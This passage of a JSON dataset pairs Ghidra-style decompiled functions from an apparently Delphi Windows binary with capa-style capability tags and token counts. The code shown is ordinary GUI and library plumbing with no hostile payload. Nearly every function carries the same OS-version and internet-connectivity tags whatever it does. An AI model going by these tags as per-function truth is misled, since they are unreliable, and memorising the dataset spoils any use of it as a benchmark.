        "decompiled_code": "\nvoid __cdecl fcn.0046aaf4(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x46abf4;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (((in_EAX == *(*(arg_8h + -8) + 100)) || (*(in_EAX + 8) != 0)) ||\n       (puVar1 = &stack0xfffffffc,  *(in_EAX + 4) != 0)) {\n        (**(**(arg_8h + -4) + 0x10))();\n        (**(**(arg_8h + -4) + 0x10))();\n        if (*(*(arg_8h + -8) + 0x74) != '\\0') {\n            (**(**(arg_8h + -8) + 0x28))();\n            fcn.0046b734();\n        }\n        (**(**(arg_8h + -4) + 0x10))();\n        arg_8h_00 = arg_8h;\n        fcn.00468e94();\n        fcn.0046aa78(arg_8h_00);\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    if (*(in_EAX + 8) != 0) {\n        fcn.0046aaf4(arg_8h);\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0046aaf4(arg_8h);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x46abfb;\n    uStack32 = 0x46abf3;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 478
    },
    "0046ac04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ac04(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x46adab;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x46ac38;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x46ac4b;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x46ac61;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x46ac6d;\n    piVar1 = fcn.00404610();\n    uStack56 = 0x46ad24;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    iVar2 = fcn.0046565c();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00465670();\n            if ((*(iVar3 + 0x57) == '\\0') && (*(iVar3 + 8) != 0)) {\n                (**(*piVar1 + 0x38))();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = (**(*piVar1 + 0x14))();\n    (**(*param_2 + 0x10))();\n    if (-1 < iVar2 + -1) {\n        do {\n            arg_8h = &stack0xfffffffc;\n            (**(*piVar1 + 0xc))();\n            fcn.0046aa78(arg_8h);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x46ad2b;\n    uStack56 = 0x46ad23;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 589
    },
    "0046af98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046af98(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x6c) == 0) {\n        iVar1 = fcn.0046565c();\n        if (0 < iVar1) {\n            fcn.004694c4(0x46afc0);\n        }\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0046b0d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b0d0(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((in_EAX != *(arg_8h + -4)) && (*(*(in_EAX + 0x14) + 0x10) == *(*(*(arg_8h + -4) + 0x14) + 0x10))) {\n        iVar1 = fcn.00469108();\n        iVar2 = fcn.00469108();\n        if ((iVar2 < iVar1) && ((*(in_EAX + 4) == 0 || ((*(in_EAX + 4) != 0 && (*(*(in_EAX + 4) + 0x57) != '\\0')))))) {\n            iVar1 = *(arg_8h + -8);\n            iVar2 = fcn.00469108();\n            if (iVar1 < iVar2) {\n                iVar2 = iVar1;\n            }\n            *(arg_8h + -8) = iVar2;\n        }\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0046b0d0(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0046b0d0(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 312
    },
    "0046b2ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b2ac(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x14) != 0) && (*(in_EAX + 0x14) != *(*(arg_8h + -4) + 100))) {\n        iVar2 = fcn.00468bc4();\n        if (iVar2 == 1) {\n            fcn.0046b2ac(arg_8h);\n        }\n    }\n    iVar2 = fcn.00468bc4();\n    if ((iVar2 == 1) || (*(in_EAX + 0x24) == 0)) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n        iVar2 = *(*(arg_8h + -4) + 0x18) + *(*(arg_8h + -4) + 0xc) + 0xe;\n        iVar3 = fcn.004691f0();\n        if (iVar3 == 0) {\n            iVar3 = fcn.004691e4();\n            if (iVar3 != 0) {\n                fcn.004691e4();\n                iVar3 = fcn.00469108();\n                if (iVar3 - *(in_EAX + 0x24) < iVar2) {\n                    bVar1 = true;\n                }\n                else {\n                    fcn.00468c20();\n                    fcn.00469130();\n                    fcn.004691e4();\n                    fcn.00469184();\n                }\n            }\n        }\n        else {\n            fcn.004691f0();\n            iVar3 = fcn.00469108();\n            iVar4 = fcn.00468c20();\n            if ((iVar3 - iVar4) - *(in_EAX + 0x24) < iVar2) {\n                bVar1 = true;\n            }\n            else {\n                fcn.00469108();\n                fcn.00469130();\n                fcn.00469108();\n                fcn.00469130();\n                fcn.004691f0();\n                fcn.00469184();\n            }\n        }\n    }\n    if (bVar1) {\n        fcn.00468dec();\n    }\n    fcn.004694c4(0x46afc0, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 555
    },
    "0046b7d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0046b7d8(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint8_t in_CL;\n    char in_DL;\n    uint var_2ch;\n    uint var_24h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (in_DL == '\\0') {\n        if ((in_CL & 0x40) == 0) {\n            fcn.00418198();\n            iVar2 = fcn.00469c40();\n            if (iVar2 != 0) {\n                if (var_8h == 0x12) {\n                    fcn.00418198();\n                    fcn.0046aebc();\n                }\n                else if (var_8h == 2) {\n                    uVar3 = fcn.00466ca8(0x203, 0x203, 0);\n                    iVar4 = sub.user32.dll_PeekMessageA(&var_24h, uVar3);\n                    if (iVar4 == 0) {\n                        cVar1 = fcn.004047cc();\n                        if (cVar1 != '\\0') {\n                            (**(**(iVar2 + 4) + 0xd4))();\n                        }\n                    }\n                    if ((*(*(iVar2 + 4) + 0x8f) == '\\x01') && (*(*(iVar2 + 4) + 0x5d) == '\\x01')) {\n                        fcn.0045f680();\n                    }\n                    *arg_8h = 1;\n                }\n            }\n        }\n        else {\n            fcn.00418198();\n            iVar2 = fcn.00469c40();\n            if (((iVar2 != 0) && (*(iVar2 + 4) != 0)) && (var_8h == 2)) {\n                fcn.0045d470();\n                fcn.0045fd44(1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 478
    },
    "0046b98c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b98c(uint noname_0, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.0046afe4();\n        fcn.00418198();\n        *(in_EAX + 0x50) = var_ch;\n        *(in_EAX + 0x54) = var_8h;\n        fcn.0046b8fc(&stack0xfffffffc);\n        fcn.0046afe4();\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0046b9dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b9dc(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char in_DL;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if (in_DL == '\\0') {\n        if (*(in_EAX + 0x60) == 0) {\n            fcn.00418198();\n            iVar2 = fcn.00469c40();\n            if ((iVar2 != 0) && (var_4h == 0x14)) {\n                cVar1 = fcn.004047cc();\n                if (cVar1 == '\\0') {\n                    fcn.0045ee64();\n                }\n                else {\n                    fcn.004785dc();\n                }\n            }\n        }\n        else {\n            fcn.0046af1c();\n        }\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "0046bbd4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046bbd4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x2c) != 0) && (*(in_EAX + 0x20) != '\\0')) {\n        fcn.0046bd14();\n        uVar1 = (**(*(in_EAX + 0x2c) + 0x2c))();\n        *(in_EAX + 0x28) = uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 129
    },
    "0046bc48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.0046bc48(void)\n\n{\n    return *0x4ab028 != '\\0';\n}\n",
        "token_count": 25
    },
    "0046bcc4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046bcc4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack8 [4];\n    \n    uVar1 = fcn.004084d4(in_EAX + 0x10, auStack8);\n    *(in_EAX + 0x18) = uVar1;\n    *(in_EAX + 0x20) = *(in_EAX + 0x1c) != 0;\n    return;\n}\n",
        "token_count": 107
    },
    "0046bd34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046bd34(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 == 0) {\n        fcn.0046bc78();\n        if (*(in_EAX + 0xd) != '\\0') {\n            fcn.0046bc94();\n            return;\n        }\n        fcn.0046bcc4();\n    }\n    else if ((param_2 == 0x68) && (*(in_EAX + 0x20) != '\\0')) {\n        if (*(in_EAX + 0xd) == '\\0') {\n            uVar1 = sub.user32.dll_SendMessageA(*(in_EAX + 0x18), *(in_EAX + 0x14), 0, 0);\n            *(in_EAX + 0x10) = uVar1;\n        }\n        else {\n            sub.user32.dll_SystemParametersInfoA(0x68, 0, in_EAX + 0x10, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "0046bd98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046bd98(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint uStack16;\n    uint uMode;\n    \n    if (*(*0x4a5178 + 0xc) != '\\0') {\n        uStack16 = 0x8000;\n        puStack20 = 0x46bdb6;\n        uVar1 = sub.kernel32.dll_SetErrorMode();\n        uStack24 = 0x46befe;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (*0x4ab040 == 0) {\n            puStack20 = &stack0xfffffffc;\n            in_stack_ffffffd8 = sub.kernel32.dll_GetModuleHandleA_2(0x46bf0c);\n            *0x4ab040 = sub.kernel32.dll_GetProcAddress_1(in_stack_ffffffd8, 0x46bf14);\n        }\n        if (*0x4a48bc == 0) {\n            *0x4a48bc = sub.kernel32.dll_LoadLibraryA(0x46bf24);\n            if (*0x4a48bc != 0) {\n                *0x4ab044 = sub.kernel32.dll_GetProcAddress_1(*0x4a48bc, 0x46bf30);\n                *0x4ab048 = sub.kernel32.dll_GetProcAddress_1(*0x4a48bc, 0x46bf40);\n                *0x4ab04c = sub.kernel32.dll_GetProcAddress_1(*0x4a48bc, 0x46bf54);\n                *0x4ab050 = sub.kernel32.dll_GetProcAddress_1(*0x4a48bc, 0x46bf6c);\n                *0x4ab054 = sub.kernel32.dll_GetProcAddress_1(*0x4a48bc, 0x46bf84);\n                *0x4ab058 = sub.kernel32.dll_GetProcAddress_1(*0x4a48bc, 0x46bf98);\n                *0x4ab05c = sub.kernel32.dll_GetProcAddress_1(*0x4a48bc, 0x46bfb0);\n                *0x4ab060 = sub.kernel32.dll_GetProcAddress_1(*0x4a48bc, 0x46bfc8);\n                *0x4ab064 = sub.kernel32.dll_GetProcAddress_1(*0x4a48bc, 0x46bfe4);\n                *0x4ab068 = sub.kernel32.dll_GetProcAddress_1(*0x4a48bc, 0x46bff0);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        sub.kernel32.dll_SetErrorMode(uVar1, 0x46bf05);\n        return;\n    }\n    return;\n}\n",
        "token_count": 661
    },
    "0046c000": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046c000(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4ab040 != NULL) {\n        uVar1 = (**0x4ab040)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 57
    },
    "0046c01c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046c01c(uint param_1, uint8_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uchar auStack20 [8];\n    \n    if ((*(*0x4a5178 + 0xc) != '\\0') && (param_2 != 3)) {\n        if (param_2 == 0) {\n            uStack24 = 0x46c04b;\n            fcn.0046c000();\n        }\n        else {\n            uStack24 = 0x46c059;\n            fcn.0046c000();\n            if (*0x4a48bc != 0) {\n                puStack28 = 0x46c06d;\n                puStack32 = &stack0xffffffe8;\n                uVar1 = (**0x4ab044)();\n                if (uVar1 != 0) {\n                    puStack28 = &stack0xffffffec;\n                    uStack40 = 0x46c084;\n                    uStack36 = uVar1;\n                    (**0x4ab04c)();\n                    uStack44 = uVar1;\n                    if (param_2 == 1) {\n                        uStack40 = 0;\n                        (**0x4ab054)();\n                    }\n                    else if (param_2 == 2) {\n                        uStack40 = 1;\n                        (**0x4ab054)();\n                    }\n                    else {\n                        uStack40 = 1;\n                        (**0x4ab054)();\n                        (**0x4ab04c)(uVar1, &stack0xffffffd4, &stack0xffffffd8);\n                        uStack44 = uStack44 & 0xfffffff4 | *(param_2 + 0x4a48bc);\n                    }\n                    (**0x4ab050)(uVar1, uStack44, uStack40);\n                    (**0x4ab048)();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 459
    },
    "0046c0f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046c0f4(void)\n\n{\n    uint uVar1;\n    \n    if (*0x4a48bc != 0) {\n        uVar1 = (**0x4ab064)();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 61
    },
    "0046c108": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046c108(void)\n\n{\n    fcn.00404640();\n    **0x4a4f48 = 0;\n    fcn.00404640();\n    **0x4a514c = 0;\n    fcn.00404640();\n    *0x4aafe4 = 0;\n    fcn.00404640();\n    sub.kernel32.dll_GlobalDeleteAtom(*0x4aaffa);\n    fcn.0040546c();\n    sub.kernel32.dll_GlobalDeleteAtom(*0x4aaff8);\n    fcn.0040546c();\n    if (*0x4a48bc != 0) {\n        sub.kernel32.dll_FreeLibrary_1(*0x4a48bc);\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "0046c474": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046c474(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar2 = *(in_EAX + 4);\n    if (iVar2 != 0) {\n        if (arg_8h != '\\0') {\n            *(iVar2 + 0x164) = 1;\n            *(iVar2 + 0x54) = *(iVar2 + 0x54) | 0x4000;\n        }\n        uStack28 = 0x46c54f;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &iStack32;\n        cVar3 = fcn.00461aa4();\n        if ((cVar3 == '\\0') || (*(*(in_EAX + 4) + 0x30) == 0)) {\n            (**(**(in_EAX + 4) + 0x88))(arg_ch, arg_10h);\n        }\n        else {\n            arg_ch = arg_ch - (*(in_EAX + 0xc) + *(in_EAX + 0x14));\n            (**(**(in_EAX + 4) + 0x88))(arg_ch, arg_10h - (*(in_EAX + 8) + *(in_EAX + 0x10)));\n        }\n        *in_FS_OFFSET = arg_ch;\n        if (arg_8h != '\\0') {\n            iVar2 = *(in_EAX + 4);\n            *(iVar2 + 0x164) = 0;\n            puVar1 = iVar2 + 0x54;\n            *puVar1 = *puVar1 & 0xbfff;\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 456
    },
    "0046ca94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0046ca94(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x3c) != 0;\n}\n",
        "token_count": 50
    },
    "0046ca9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046ca9c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x3c) == 0) {\n        fcn.0046cc6c();\n    }\n    return;\n}\n",
        "token_count": 56
    },
    "0046cc34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046cc34(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    cVar1 = fcn.0046ca94();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x42) == '\\0')) {\n        uVar2 = fcn.0046cbd0();\n        sub.comctl32.dll_ImageList_Destroy(uVar2);\n    }\n    *(in_EAX + 0x3c) = 0;\n    fcn.0040483c();\n    return;\n}\n",
        "token_count": 129
    },
    "0046cef4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046cef4(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    uint in_EDX;\n    uint var_28h;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.0046ca94();\n    if (cVar1 != '\\0') {\n        if (arg_8h == '\\0') {\n            if (*(in_EAX + 0x54) == 0) {\n                piVar3 = fcn.0042cbe0();\n                *(in_EAX + 0x54) = piVar3;\n                fcn.0042dfe4();\n                (**(*piVar3 + 0x40))();\n                (**(*piVar3 + 0x34))();\n            }\n            fcn.0042d1b4();\n            fcn.00428404();\n            fcn.004181c0(&var_28h, *(in_EAX + 0x30));\n            fcn.0042d1b4(&var_28h);\n            fcn.004287a8();\n            fcn.0042d1b4(0, 0, 0, 0, 0xffffffff, 0, 0);\n            uVar2 = fcn.00428b60();\n            uVar2 = fcn.0046cbd0(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n            fcn.004181c0(&var_18h, arg_10h + *(in_EAX + 0x30));\n            fcn.0042d1b4();\n            var_8h = fcn.00428b60();\n            fcn.00428404();\n            uVar2 = fcn.00428b60();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt\n                      (uVar2, arg_14h + 1, arg_10h + 1, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n            fcn.00428404();\n            uVar2 = fcn.00428b60();\n            sub.gdi32.dll_SetTextColor(uVar2, 0xffffff);\n            sub.gdi32.dll_SetBkColor(uVar2, 0);\n            sub.gdi32.dll_BitBlt(uVar2, arg_14h, arg_10h, *(in_EAX + 0x34), *(in_EAX + 0x30), var_8h, 0, 0, 0xe20746);\n        }\n        else {\n            uVar2 = fcn.0046c8e4(arg_ch);\n            fcn.0046cecc(uVar2);\n            uVar2 = fcn.0046c8e4();\n            uVar2 = fcn.00428b60(arg_14h, arg_10h, 0, 0, uVar2);\n            uVar2 = fcn.0046cbd0(var_4h, uVar2);\n            sub.comctl32.dll_ImageList_DrawEx(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 798
    },
    "0046d6f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0046d6f8(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) == 0) {\n        iVar2 = fcn.0046cdd8();\n        return 0 < iVar2;\n    }\n    cVar1 = fcn.004047cc();\n    if ((cVar1 != '\\0') && (cVar1 = fcn.0046d608(),  cVar1 != '\\0')) {\n        return false;\n    }\n    return true;\n}\n",
        "token_count": 138
    },
    "0046d7ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046d7ac(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puVar3;\n    int32_t iStack112;\n    uint uStack108;\n    uchar *puStack104;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_30h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    puStack84 = 0x46d7c9;\n    var_4h = in_EAX;\n    fcn.0041b6b8();\n    puStack84 = 0x46d7d8;\n    fcn.0041b6b8();\n    puStack84 = 0x46d7e4;\n    var_8h = fcn.0042cbe0();\n    uStack88 = 0x46da30;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    iVar1 = fcn.0041b48c();\n    (**(*var_8h + 0x54))();\n    puStack104 = 0x46d817;\n    fcn.0041b4ac(var_18h + iVar1, var_18h + iVar1 >> 0x1f);\n    puStack104 = 0x46d823;\n    var_10h = fcn.0042cbe0();\n    uStack108 = 0x46da13;\n    iStack112 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff90;\n    puStack104 = &stack0xfffffffc;\n    (**(*var_10h + 0x54))();\n    var_ch = fcn.0042cbe0();\n    (**(*var_ch + 0x40))();\n    (**(*var_ch + 0x34))();\n    var_14h = fcn.0042cbe0();\n    fcn.0042dfe4();\n    (**(*var_14h + 0x40))();\n    (**(*var_14h + 0x34))();\n    fcn.004181c0(&fcn.0046d7ac::var_30h, *(var_4h + 0x30));\n    fcn.0046ddd8();\n    puVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    iVar1 = (**(*var_8h + 0x20))();\n    iVar1 = iVar1 / *(var_4h + 0x30);\n    if (-1 < iVar1 